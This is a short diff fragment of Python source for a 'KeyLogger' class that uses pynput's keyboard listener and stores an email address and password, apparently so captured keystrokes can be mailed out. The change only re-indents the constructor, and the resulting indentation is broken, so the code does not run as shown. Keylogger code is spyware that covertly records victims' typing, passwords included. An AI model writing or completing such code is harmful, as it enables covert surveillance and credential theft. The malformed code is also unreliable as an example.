@@ -29,11 +29,11 @@ from pynput.keyboard import Listener
 
 
 class KeyLogger:
-def __init__(self, time_interval, email, password):
-self.interval = time_interval
-self.log = "KeyLogger Started..."
-self.email = email
-self.password = password
+    def __init__(self, time_interval, email, password):
+    self.interval = time_interval
+    self.log = "KeyLogger Started..."
+    self.email = email
+    self.password = password
 
 def appendlog(self, string):
 self.log = self.log + string
